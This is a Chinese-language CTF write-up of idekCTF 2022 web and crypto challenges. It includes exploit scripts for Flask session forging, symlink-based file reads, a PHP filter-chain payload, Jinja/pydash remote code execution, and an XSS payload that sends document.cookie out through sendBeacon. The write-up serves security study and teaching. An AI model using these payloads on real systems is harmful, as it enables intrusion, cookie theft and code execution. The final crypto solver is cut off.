# idek 2022* Web && Crypto Writeup

## 前言

根据前面我们所整理的wp,这里最后将web&&Crypto的writeup整理完毕在此呈现,希望大家共同学习进步.本比赛的部分Web和Crypto比较困难而且有趣.之后我们会推出一些复现文章,敬请期待.

![](https://imgur.com/x2Krcsf.png)

也欢迎对国际比赛感兴趣的师傅,欢迎简历`root@r3kapig.com`.我们会及时回复

## Web:

### Readme:

很简单签到题，算是个逻辑漏洞问题

这个程序中只有一个路由

```go
http.HandleFunc("/just-read-it", justReadIt)
```

首先简单看一下可以得出程序逻辑如果能成功走到justReadIt函数最下方就能获得flag

```go
func justReadIt(w http.ResponseWriter, r *http.Request) {
        defer r.Body.Close()

        body, err := ioutil.ReadAll(r.Body)
        if err != nil {
                w.WriteHeader(500)
                w.Write([]byte("bad request\n"))
                return
        }

        reqData := ReadOrderReq{}
        if err := json.Unmarshal(body, &reqData); err != nil {
                w.WriteHeader(500)
                w.Write([]byte("invalid body\n"))
                return
        }

        if len(reqData.Orders) > MaxOrders {
                w.WriteHeader(500)
                w.Write([]byte("whoa there, max 10 orders!\n"))
                return
        }

        reader := bytes.NewReader(randomData)
        validator := NewValidator()

        ctx := context.Background()
        for _, o := range reqData.Orders {
                if err := validator.CheckReadOrder(o); err != nil {
                        w.WriteHeader(500)
                        w.Write([]byte(fmt.Sprintf("error: %v\n", err)))
                        return
                }

                ctx = WithValidatorCtx(ctx, reader, int(o))
                _, err := validator.Read(ctx)
                if err != nil {
                        w.WriteHeader(500)
                        w.Write([]byte(fmt.Sprintf("failed to read: %v\n", err)))
                        return
                }
        }

        if err := validator.Validate(ctx); err != nil {
                w.WriteHeader(500)
                w.Write([]byte(fmt.Sprintf("validation failed: %v\n", err)))
                return
        }

        w.WriteHeader(200)
        w.Write([]byte(os.Getenv("FLAG")))
}
```

我们一点一点来看，首先是接受了一个传来的json数据，解析保存到reqData当中，从下面可以看出只接受一个完全由数字组成的int数组，字段名叫orders

```go
type ReadOrderReq struct {
        Orders []int `json:"orders"`
}
```

之后会用randomData初始化一个reader

```
reader := bytes.NewReader(randomData)
```

而这个randomData则是由initRandomData函数初始化，记住这个password复制在了12625之后

```go
func initRandomData() {
        rand.Seed(1337)
        randomData = make([]byte, 24576)
        if _, err := rand.Read(randomData); err != nil {
                panic(err)
        }
        copy(randomData[12625:], password[:])
}
```

初始化之后会遍历`reqData.Orders`
调用`CheckReadOrder`检查oders中的int值范围是否在0-100

```go
func (v *Validator) CheckReadOrder(o int) error {
        if o <= 0 || o > 100 {
                return fmt.Errorf("invalid order %v", o)
        }
        return nil
}
```

之后根据数值读出指定位数的值

```go
if err := validator.Validate(ctx); err != nil {
                w.WriteHeader(500)
                w.Write([]byte(fmt.Sprintf("validation failed: %v\n", err)))
                return
        }

        w.WriteHeader(200)
        w.Write([]byte(os.Getenv("FLAG")))
```

这个函数功能就是读32位，之后与password比较，成功返回true，而我们前面说过这个password复制在了12625之后，并且oders数组容量最多只能有10个数字

```go
func (v *Validator) Validate(ctx context.Context) error {
        r, _ := GetValidatorCtxData(ctx)
        buf, err := v.Read(WithValidatorCtx(ctx, r, 32))
        if err != nil {
                return err
        }
        if bytes.Compare(buf, password[:]) != 0 {
                return errors.New("invalid password")
        }
        return nil
}
```

就算全取最大100，10个也才1000，距离我们的12625还差很远

再往前看发现read之前

```go
func (v *Validator) Read(ctx context.Context) ([]byte, error) {
        r, s := GetValidatorCtxData(ctx)
        buf := make([]byte, s)
        _, err := r.Read(buf)
        if err != nil {
                return nil, fmt.Errorf("read error: %v", err)
        }
        return buf, nil
}
```

有这样一个调用，如果size大于等于100会调用一个bufio.NewReader

```go
func GetValidatorCtxData(ctx context.Context) (io.Reader, int) {
        reader := ctx.Value(reqValReaderKey).(io.Reader)
        size := ctx.Value(reqValSizeKey).(int)
        if size >= 100 {
                reader = bufio.NewReader(reader)
        }
        return reader, size
}
```

这个defaultBufSize是4096

```go
// NewReader returns a new Reader whose buffer has the default size.
func NewReader(rd io.Reader) *Reader {
        return NewReaderSize(rd, defaultBufSize)
}
```

最终

![](https://imgur.com/UMCkOg9.png)

### SimpleFileServer:

也是python的flask的题目

可以看到获得flag的条件，那就是成为admin，所以很容易猜测到考点是session伪造，而flask里面这个session的生成通常和变量`app.config["SECRET_KEY"]`息息相关

```python
@app.route("/flag")
def flag():
    if not session.get("admin"):
        return "Unauthorized!"
    return subprocess.run("./flag", shell=True, stdout=subprocess.PIPE).stdout.decode("utf-8")
```

因此一切的前提是我们能获得这个`SECRET_KEY`

```python
app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
```

而这部分生成在config.py当中

要爆破这部分很明显一是我们需要知道这个`time.time()`的值，另一个还需要知道`SECRET_OFFSET`的偏移

除开注册与登录路由，upoad支持上传一个zip文件并解压到指定目录

```python
@app.route("/upload", methods=["GET", "POST"])
def upload():
    if not session.get("uid"):
        return redirect("/login")
    if request.method == "GET":
        return render_template("upload.html")

    if "file" not in request.files:
        flash("You didn't upload a file!", "danger")
        return render_template("upload.html")
    
    file = request.files["file"]
    uuidpath = str(uuid.uuid4())
    filename = f"{DATA_DIR}uploadraw/{uuidpath}.zip"
    file.save(filename)
    subprocess.call(["unzip", filename, "-d", f"{DATA_DIR}uploads/{uuidpath}"])    
    flash(f'Your unique ID is <a href="/uploads/{uuidpath}">{uuidpath}</a>!', "success")
    logger.info(f"User {session.get('uid')} uploaded file {uuidpath}")
    return redirect("/upload")
```

uploads/xxx路由支持我们之间读取上传解压后的文件内容

```python
@app.route("/uploads/<path:path>")
def uploads(path):
    try:
        return send_from_directory(DATA_DIR + "uploads", path)
    except PermissionError:
        abort(404)
```

这个读文件部分按理说只能读取uploads下的文件，看看底层实现用的是safe_join不支持跨目录读取

![](https://imgur.com/4voOjHo.png)

可以看到在这里获取路径path后，最终调用open打开文件并返回内容

![](https://imgur.com/3OWl2eR.png)

解决方法是可以配合symlink软连接实现任意文件读，这样我们一方面可以读config.py获取`SECRET_OFFSET`

另一方面为了得到时间

可以看到题目很良心的在`server.log`当中输出了time

```python
# Configure logging
LOG_HANDLER = logging.FileHandler(DATA_DIR + 'server.log')
LOG_HANDLER.setFormatter(logging.Formatter(fmt="[{levelname}] [{asctime}] {message}", style='{'))
logger = logging.getLogger("application")
logger.addHandler(LOG_HANDLER)
logger.propagate = False
for handler in logging.root.handlers[:]:
    logging.root.removeHandler(handler)
logging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')
logging.getLogger().addHandler(logging.StreamHandler())
```

不过这个时间不是精确的，通过转换为时间戳我们只能精确到整数部分，不过好在这里随机数的seed是配合round做了取整因此我们就能很容易实现爆破了

![](https://imgur.com/v0iCOF4.png)

我们可以很方便配合这个信息得到time.time()的值
本地ln做一个symlink的文件

![](https://imgur.com/9iIFU0F.png)

之后爆破到`SECRET_KEY`后，修改admin为true再生成session即可

```python
decoded = {'admin': True, 'uid': userinfo['username']}
```

最终exp，配合flask_unsign(https://github.com/Paradoxis/Flask-Unsign)

```python
import base64

import requests, re, time, datetime, random
import flask_unsign

sess = requests.session()
SECRET_OFFSET = -67198624 * 1000
userinfo = {"username": "yyds", "password": "yyds"}
baseurl = "http://127.0.0.1:1337/"
pocZip = "UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA"
cookie = ""
log_url = ""

def register():
    reg_url = baseurl + "register"
    sess.post(reg_url, userinfo)


def login():
    global cookie
    set_cookie = sess.post(baseurl + "login", data=userinfo, allow_redirects=False).headers['Set-Cookie']
    cookie = set_cookie[8:82]


def upload():
    global log_url
    log_url = re.search('<a href="/uploads/.*">', sess.post(
        baseurl + "upload", headers={'Cookie': f'session={cookie}'},
        files={'file': base64.b64decode(pocZip)}).text).group()[9:-2]

def read():
    server_log = baseurl + log_url + "/server.log"
    config = baseurl + log_url + "/config.py"
    SECRET_OFFSET = int(re.findall("SECRET_OFFSET = (.*?) # REDACTED", sess.get(config).text)[0]) * 1000
    log = sess.get(server_log).text
    now = (time.mktime(datetime.datetime.strptime(log.split('\n')[0][1:20], "%Y-%m-%d %H:%M:%S").timetuple())) * 1000
    return SECRET_OFFSET,now



if __name__ == '__main__':
    register()
    login()
    upload()
    SECRET_OFFSET, now = read()
    while 1:
        decoded = {'admin': True, 'uid': userinfo['username']}
        random.seed(round(now + int(SECRET_OFFSET)))
        SECRET_KEY = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
        flag_url = baseurl + "flag"
        res = sess.get(flag_url, headers={'Cookie': f'session={flask_unsign.sign(decoded, SECRET_KEY)}'}).text
        if "idek" not in res:
            now += 1
            print(now)
            continue
        print(res)
        break
```

### JSON Beautifier:

关键点在于 outputBox.innerHTML是没过滤的 可以看到csp是 `script-src 'unsafe-eval' 'self'; object-src 'none'`; 

beautify 中，如果设置了 config.debug  JSON.stringify(userJson, null, cols)的输出会被eval()

只要能控制 cols 就可以

但是现在的问题是传统的clobbering不生效的 所以我翻了一些标签
https://portswigger.net/research/dom-clobbering-strikes-back 找到了frameset

```html
<iframe name=config srcdoc=&quot;<head id=debug></head><frameset id=opts cols=eval(name)></frameset>&quot;></iframe>'></iframe>
```

这样就能get到一个xss了 

但我们现在有一个问题 首先刚才说的东西 eval()都在beautify()里面触发  只有beautify函数被加载时候才会生效

所以需要用户输入和`DOMCharacterDataModified`事件被触发 但我们可以做到一个事情 首先在我们将上面属性都破坏的前提下 再加载一下main.js即可

poc大概如下

```html
{"xxx":"<iframe name='navigator.sendBeacon(atob(/url/.source),document.cookie)' srcdoc='<div id=json-input>[-3]</div><script defer src=/static/js/main.js></script><iframe name=config srcdoc=&quot;<head id=debug></head><frameset id=opts cols=eval(name)></frameset>&quot;></iframe>'></iframe>"}
```

### Paywall:

想看原理的移步陆队之前写的，由于有现成的工具直接当脚本小子即可

https://tttang.com/archive/1395/#toc_iconv-filter-chain

本题是用php实现的一个blog系统，除开样式读取核心代码非常简单

```php
<?php

        error_reporting(0);
        set_include_path('articles/');

        if (isset($_GET['p'])) {
            $article_content = file_get_contents($_GET['p'], 1);

            if (strpos($article_content, 'PREMIUM') === 0) {
                die('Thank you for your interest in The idek Times, but this article is only for premium users!'); // TODO: implement subscriptions
            }
            else if (strpos($article_content, 'FREE') === 0) {
                echo "<article>$article_content</article>";
                die();
            }
            else {
                die('nothing here');
            }
        }
           
    ?>

```

可以看到，对于文章内容前是`PREMIUM`的不能读取，`FREE`的则可以读
很可惜我们的flag文件恰好前面也是`PREMIUM`，那么要想读取这个文件很显然我们可以配合php的filter构造出FREE四个字母也就可以实现读取了

![](https://imgur.com/WMKbVQF.png)

下面是工具

https://github.com/synacktiv/php_filter_chain_generator

https://github.com/WAY29/php_filter_chain_generator

发现直接生成出来的虽然有FREE，但是都无法看了

```
FREE�B�5$TԕT���FV��F�F��U�E�7V'65##�u�C��W%��7w5�W"����>==�@C������>==�@
```

然而发现把每个环节的`convert.iconv.UTF8.UTF7`去掉

就可以变成明文了，脚本小子表示很神奇，最后为了不丢失符号(毕竟Base64字符里面没有一些特殊符号`!{}!`之类的)，因此第一步事先base64enccode一下

最终得到payload

```
http://127.0.0.1/?p=php://filter/convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode/resource=flag
```

但是根据这样构造本地发现会少最后三个字符，除开}符号还剩两个
看看题目描述可以猜出最后俩字符，Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPPaper，最后一个字母肯定是个符号所以是!

`idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}`

![](https://imgur.com/nqwXgqR.png)

当然最后发现工具也可以直接用，注意后面有俩空格

```
python php_filter_chain_generator.py --chain 'FREE  '
```

得到

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag
```

![](https://imgur.com/SBiDtA2.png)

### task manager:

本题当时没有做出来属于赛后复现,不过比较有意思

作者参考了部分来自以下文章的思路

https://blog.abdulrah33m.com/prototype-pollution-in-python/

题目有点原型链污染的味道，也可以说是借鉴了pyjail的一些思路，很有意思的一道题目。
作者提供了对于 `pydash.set_` 的封装，可以通过变量路径设置值，类似一个高级版的 `setattr`。比如：

```
>>> pydash.set_({"A":{"B":"C"}}, "A.B", "D")
{'A': {'B': 'D'}}
```

#### 寻找访问 app 的方法:

在 `taskmanager.py` 里面调用 `pydash.set_()` 可以通过实例化的 `TaskManager` 对象利用特殊属性实现对 `app` 对象的修改：

```
pydash.set_(
    TaskManager(),
    '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.xxx',
    'xxx'
)
```

#### 将 eval 加入模板全局变量

然后再回来看 `app.py` ，可以发现一段很奇怪的代码：

![](https://imgur.com/nbQ0LT4.png)

既然 `app` 已经可控了，如果能够实现 `before_first_request` 的重复调用那么就可以在模板中实现任意代码执行了，经过一些寻找发现可以通过将 `app._got_first_request` 设置为 `False` 实现。

#### 设法调用 eval

接下来就是寻找方法对已经放入模板全局变量的 `eval` 函数进行调用，而 `add_template_global` 函数是通过 `__name__` 来确定变量名字的，但是 builtin 函数的 `__name__` 是只读的，所以没有办法用来改个名字放进去，只有找现有文件中存在 eval 的来当作模板。在题目中只有 `app.py` 出现了 eval ，可以尝试利用。

这里使用的方法是对 `app.jinja_env` 的 `variable_start_string` 和 `variable_end_string` 进行替换，原本 jinja 是通过识别 `{{.*}}` 来识别模板中的变量的，但是我们可以通过修改这两个值来更改 jinja 识别变量的方式，从而拼接出一个rce。

#### 绕过 jinja 的目录穿越检查实现任意文件渲染

下面一个问题是现在只能够对 `templates` 下面的文件进行渲染，但是这里面的 html 很明显是用不了的，所以要想办法让他可以渲染任意文件，在 jinja 源码(https://github.com/pallets/jinja/blob/36b601f24b30a91fe2fdc857116382bcb7655466/src/jinja2/loaders.py#L24-L38) 可以看到是通过 `os.path.pardir` 来对目录穿越进行了保护，但是我们可以通过修改 `pardir` 的值来绕过。

最后在对 `app.py` 进行利用的时候发现虽然出现了 `eval` ，但是并没有 `eval(.*)` 的形式出现，尝试通过修改 `app.jinja_env` 的 `comment_start_string` 和 `comment_end_string` 来让 jinja 把文件的一部分当作注释删掉来凑成一个 `eval(.*)` 的形式，但是 jinja 解析时会报错，后来发现 `{{ eval{# #}(.*) }}` 这种中间有注释的模板变量本来就不能正常解析，但是现在既然可以渲染任意文件了，所以可以尝试在 python 库里面寻找出现 `eval(.*)` 的文件，最后找到了 `turtle.py`。

#### exp:

```py
import requests
import re

base_url = 'http://127.0.0.1:1337'
url      = f'{base_url}/api/manage_tasks'
exp_url  = f'{base_url}/../../usr/local/lib/python3.8/turtle.py'
app      = '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app'

# add eval to template globals
requests.post(url, json={"task": f"{app}.env", "status": "yolo"})
requests.post(url, json={"task": f"{app}._got_first_request", "status": None})

# bypass jinja directory traversal check
requests.post(url, json={"task": "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir", "status": "foobar"})

# change jinja_env
requests.post(url, json={"task": f"{app}.jinja_env.variable_start_string", "status": """'""']:\n            value = """})
requests.post(url, json={"task": f"{app}.jinja_env.variable_end_string", "status": "\n"})

# add global vars
requests.post(url, json={"task": f"{app}.jinja_env.globals.value", "status": "__import__('os').popen('cat /flag-*.txt').read()"})

# get flag
s = requests.Session()
r = requests.Request(method='GET', url=exp_url)
p = r.prepare()
p.url = exp_url
r = s.send(p)
flag = re.findall('idek{.*}', r.text)[0]
print(flag)
```

#### 非预期:

由于作者把 flag 写在 Dockerfile 里面了，并且在构建容器的时候是通过 `RUN echo "idek{[REDACTED]}" > /flag-$(head -c 16 /dev/urandom | xxd -p).txt` 写的 flag 通过`COPY . .`添加的题目代码，这就意味着 Dockerfile 本身也被复制进了容器，所以在实现 LFI 之后就可以直接读取 Dockerfile 就可以拿到 flag 了

```py
import requests
import re

base_url = 'http://127.0.0.1:1337'
url      = f'{base_url}/api/manage_tasks'
exp_url  = f'{base_url}/../Dockerfile'

# bypass jinja directory traversal check
requests.post(url, json={"task": "__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir", "status": "foobar"})

# get flag
s = requests.Session()
r = requests.Request(method='GET', url=exp_url)
p = r.prepare()
p.url = exp_url
r = s.send(p)
flag = re.findall('idek{.*}', r.text)[0]
print(flag)
```

#### 通过 `jinja2.runtime.exported` 实现 rce

> https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager

通过 jinja 源码(https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1208) 可以发现模板的生成其实是调用了 `environment.from_string`，而在 `from_string` 函数中又调用了(https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1105) `environment.compile`，并且对 `compile` 会返回一个 `code` 对象，后续会被 exec(https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1222)，如果我们能够控制这里 exec 的内容那么就可以实现 rce。
经过简单的调试可以 在这里(https://github.com/pallets/jinja/blob/main/src/jinja2/compiler.py#L839) 发现在生成代码的时候有一个可控变量 `exported_names`，他是 runtime(https://github.com/pallets/jinja/blob/main/src/jinja2/runtime.py#L45) 里面的一个数组，所以我们完全可以通过 `pydash.set_()` 来进行覆盖，从而达到 rce。

```py
import requests, re

base_url = 'http://127.0.0.1:1337'
url      = f'{base_url}/api/manage_tasks'
flag_url = f'{base_url}/../../tmp/flag'

payload = '''*
__import__('os').system('cp /flag* /tmp/flag')
#'''

# bypass jinja directory traversal check
requests.post(url, json={"task": "__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.os.path.pardir", "status": "foobar"})

# replace exported to prepare rce
requests.post(url, json={"task": "__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0", "status": payload})

# trigger rce
requests.get(f'{base_url}/home.html')

# get flag
s = requests.Session()
r = requests.Request(method='GET', url=flag_url)
p = r.prepare()
p.url = flag_url
r = s.send(p)
flag = re.findall('idek{.*}', r.text)[0]
print(flag)
```

## Crypto:

### Cleithrophobia:

以一段3*16bit长的明文为例，填充与加密流程如下（最后会将密文反序输出）：

b1, b2, b3

b0(rand), b1, b2, b3, b4(pad)

b0, b0^E(b1), b1^E(b2), b2^E(b3), b3^E(b4)

b0, D(b3^E(b4))^(b0), D(b2^E(b3))^(b3^E(b4)), D(b1^E(b2))^(b2^E(b3)), D(b0^E(b1))^(b1^E(b2))

考虑在这个过程中构造加密、解密的payload

Enc-payload：b0(rand), b'\x00'*16, b2, msg, b4(pad)

- 此时密文中D(b1^E(b2))^(b2^E(b3))=D(E(b2))^b2^E(msg)=b2^b2^E(msg)=E(msg)

Dec-payload：b0(rand), b1, b2, msg^E(b4), b4(pad)

- 此时密文中D(b3^E(b4))^(b0)=D(msg^E(b4)^E(b4))^b0=D(msg)^b0，且b0已知
至此即可将密文链条恢复到前一状态，进而得到明文

```py
from pwn import *
host, port = 'cleithrophobia.chal.idek.team:1337'.split(':')
io = remote(host, int(port))


def oracle(payload):
    io.sendlineafter(b'|    > (hex) ', payload.hex().encode())
    io.recvuntil(b'|\n|   ')
    now = bytes.fromhex(io.recvline().strip().decode())
    return [now[i:i+16] for i in range(0, len(now), 16)][::-1]


def enc(block):
    assert len(block) == 16
    payload = b'\x00' * 32 + block
    res = oracle(payload)
    return res[3]


def dec(block):
    assert len(block) == 16
    mask = enc(b'\x10' * 16)
    payload = b'\x00' * 32 + xor(block, mask)
    res = oracle(payload)
    return xor(res[0], res[1])

# rand, b1, b2, b3, pad
# b0, b0^E(b1), b1^E(b2), b2^E(b3), b3^E(b4)
# b0, D(b3^E(b4))^(b0), D(b2^E(b3))^(b3^E(b4)), D(b1^E(b2))^(b2^E(b3)), D(b0^E(b1))^(b1^E(b2))
io.recvuntil(b'flag = ')
flag = bytes.fromhex(io.recvline().strip().decode())
flag = [flag[i:i+16] for i in range(0, len(flag), 16)][::-1]
t1 = [flag[0]]
for i in range(len(flag) - 1):
    t1 += [enc(xor(flag[i+1], t1[-1]))]
t1 = t1[:1] + t1[1:][::-1]
t2 = [flag[0]]
for i in range(len(flag) - 1):
    t2 += [dec(xor(t1[i+1], t2[-1]))]
flag = b''.join(t2)
print(flag)
# flag{wh0_3v3n_c0m3s_up_w1th_r1d1cul0us_sch3m3s_l1k3_th1s__0h_w41t__1_d0}
```

### ECRSA:

先将椭圆曲线的加法在有理数域下进行计算得到3T的坐标值，而有理数域下的除法相当于模下乘逆元，因此3T的两个坐标值可以得到模n下的两个等式，然后再根据3T在该曲线上，得到另一个等式，联立这三个等式，发现第三个等式为一个关于a的线性方程，在有理数域下解得a的值，代入前两式，然后对两式的计算结果的分子求gcd，即可得到n的值；得到n的值后，因为e,d都已知，故可以分解n，分别在GF(p)和GF(q)上求得ECC的阶，将两阶相乘得到Zmod(n)下的阶，然后解密即可得到flag。

```py
#sage
from gmpy2 import *
from Crypto.Util.number import long_to_bytes

def add(P, Q):
    x0, y0 = P
    x1, y1 = Q
    if P == Q:
        lmd = (3*x0**2+a)/(2*y0)
    else:
        lmd = (y1-y0) / (x1-x0)
    x2 = lmd**2 - x1 - x0
    y2 = lmd*(x0 - x2) - y0
    return x2, y2
R.<a> = PolynomialRing(ZZ)
P = (ZZ(int.from_bytes(b"ECRSA offers added security by elliptic entropy.", 'big')), 2)
P2 = add(P, P)
P3 = add(P, P2)
f = str(P3[0]).split('/') + str(P3[1]).split('/')
f = [R(i) for i in f]

Te = (79615329406682121028641446306520032869660130854153788352536429332441749473394735222836513266191300847548366008281109415002581029448905418880962931523411475044527689429201653146200630804486870653795937020571749192405439450656659472253086567149309166068212312829071678837253421625687772396105149376211148834937,114576105009077728778286635566905404081211824310970349548035698466418670695753458926421098950418414701335730404414509232776047250916535638430446206810902182305851611221604003509735478943147034397832291215478617613443375140890349118302843641726392253137668650493281241262406250679891685430326869028996183320982)
Me = (115076663389968253954821343472300155800654332223208277786605760890770425514748910251950393842983935903563187546008731344369976804796963863865102277460894378910744413097852034635455187460730497479244094103353376650220792908529826147612199680141743585684118885745149209575053969106545841997245139943766220688789,74232642959425795109854140949498935461683632963630260034964643066394703345139733396470958836932831941672213466233486926122670098721687149917605871805886006479766670309639660332339984667770417687192717160061980507220617662938436637445370463397769213554349920956877041619061811087875024276435043752581073552318)

f0 = f[0] - f[1] * Te[0]
f1 = f[2] - f[3] * Te[1]
f2 = Te[0]**3 + a*Te[0] - Te[1]**2-(Me[0]**3 + a*Me[0] - Me[1]**2)
print(f2)
a0=-1019268867267849424908357367733931941383149668286864008861662442680604058151693707791547011105186550019092586871229367602480951232469366295595128740384313397226761125592114592001298261062965213964211518794413291961567779146411551935492149763883963272734637871273976142997464735273842094527385872407012350495753298964870092922939941557312324244091706263803037684216879489854927518197495340486943316099448245524778860809444971443935794707968413693163036741320366137839392605690457251072731869232133843078162397057596189198269026990658078279998575424676768178510688889622050681034958153231556029864713685758814785896436116013310016899574654253785383489362957328536913784532588181648611237704933470028564747329012603054002623952267126949886810588734363614455501359064859547724824540676184962858003962647114120432607459636061800842389469449254464940592103479283633803337327710969181902456604551946745128222513462440426982787689316/35461333983286132926179897165780122930994201369054489434069331558328676041354175029113880576792635056014821537727621929367395775348058444984139345937482903866216723668650381489254556656243626825448157082781627457815353457873166675359113112992434419615906572916077530737800547480858069601139990567555071853852
#assert Zmod(n)(a0)==a1
b1=int(str(f0(a0)).split('/')[0])
b2=int(str(f1(a0)).split('/')[0])

n=ZZ(gcd(b1,b2))
d=99193023581616109152177764300040037859521925088272985981669959946817746109531909713425474710564402873765914926441545005839662821744603138460681680285655317684469203777533871394260260583839662628325884473084768835902143240687542429953968760669321064892423877370896609497584167478711224462305776836476437268587
a=Zmod(n)(a0)
b=(Te[1]^2-(Te[0]^3+a*Te[0]))%n

print(n)
p=12290271213546041363951851773787980582602437964255454723585180242187866091592878156042540239644364150942318226563612517243038643884916020981628688069132457
q=12106285759457603837646209698473787447139576157605716627376889077738609086595516271990595704705464336024969899141833853372028724555298162959385807206566981
E1=EllipticCurve(GF(p),[a,b])
E2=EllipticCurve(GF(q),[a,b])
E=EllipticCurve(Zmod(n),[a,b])
#order=E1.order()*E2.order()
order=148789535372424163728266646450060056789282887632409478972504939920226619164296671910830162422173521086104260442096339694304886999126003562791358712412416317442287195786906697615489065379945573862193455179868067475036156124279466870451072060581891741234837916854904063588317305400955406105882208744056825746850
print(order)
dd=invert(3,order)
print(long_to_bytes(ZZ((E(Me)*dd)[0])))
'''
b"It is UNBREAKABLE, I tell you!! I'll even bet a flag on it, here it is: idek{Sh3_s3ll5_5n4k3_01l_0n_7h3_5e4_5h0r3}"
'''
```

### Chronophobia：
由于不知道n的分解，我们无法计算出phi，也就无法快速计算出 

$$2^{2^d}  mod  n$$ 

的值，但是题目提供了一个oracle，可以帮我们计算出给定token的计算结果的高200个十进制位，而低位大概是108个十进制位，于是我们可以通过以下方法求出给定token的低位：

$$c_1\equiv token^r mod n$$

$$c_2=(token^2)^r mod n$$

$$c_1^2-c_2\equiv 0 mod n$$

$$(c_{1h}+c_{1l})^2-(c_{2h}+c_{2l})\equiv 0 mod n$$

于是我们对两个低位使用二元coppersmith，就可以计算出结果，进而可以恢复整个结果。
值得注意的地方是，二元coppersmith的参数很重要，一开始我直接用的默认m和d，发现结果虽然会满足 

$$c_1^2-c_2\equiv 0 mod n$$ 

，但是却并不是我们所需要的解，将参数设置为m=4,d=4，就可以把我们需要的结果copper出来。

```py
#sage
from pwn import *
import itertools
from Crypto.Util.number import *

def small_roots(f, bounds, m=2, d=None):
    if not d:
        d = f.degree()

    R = f.base_ring()
    N = R.cardinality()

    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)

    G = Sequence([], f.parent())
    for i in range(m+1):
        base = N^(m-i) * f^i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)

    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)

    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)

    B = B.dense_matrix().LLL()

    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1/factor)

    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B*monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots

    return []

context.log_level="debug"
#s=process(['python3','oracle.py'])
s=remote("chronophobia.chal.idek.team",1337)
s.recvuntil(b'Here is your random token: ')
t=int(s.recvline()[:-1].decode())
s.recvuntil(b'The public modulus is: ')
n=int(s.recvline()[:-1].decode())
s.recvuntil(b'Do 2^')
d=int(s.recvline()[:3].decode())
